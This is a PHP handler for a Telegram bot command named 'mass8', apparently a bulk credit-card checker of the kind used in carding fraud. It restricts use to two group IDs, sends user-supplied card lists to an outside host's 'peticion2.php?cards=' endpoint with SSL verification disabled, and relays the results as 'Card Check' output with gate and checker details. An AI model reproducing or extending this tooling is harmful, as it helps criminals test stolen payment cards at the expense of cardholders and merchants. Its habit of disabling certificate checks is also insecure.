<?php
$cmd = Command($message);
if (strtolower($cmd['command']) == "mass8") {
    $data = $cmd['data'];
    $tiempo_inicial = microtime(true);
    
if ($gId != '5168647868' && $gId != '5071609286')
    {
            die();
    
    }
    
    //-------------------------------------------------------------
$m1 = bot("sendmessage", [
        "chat_id" => $chatId,
        "text" => "<b>Checking status... Please hold on while we verify.</b>",
        "parse_mode" => "html",
        "reply_to_message_id" => $message_id,
    ]);

$ms1 = capture(json_encode($m1), '"message_id":', ",");

$data = urlencode($data);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://arturo.alwaysdata.net/MultiHilos/peticion2.php?cards=$data");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$response = curl_exec($ch);

   bot("editMessageText", [
        "chat_id" => $chatId,
                "text" => "processing...",
        'disable_web_page_preview' => true,
        "parse_mode" => "html",
        "message_id" => $ms1,]);
        

    bot("editMessageText", [
        "chat_id" => $chatId,
        "text" => $response."<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
        'disable_web_page_preview' => true,
        "parse_mode" => "html",
        "message_id" => $ms1,]);
}
  
  
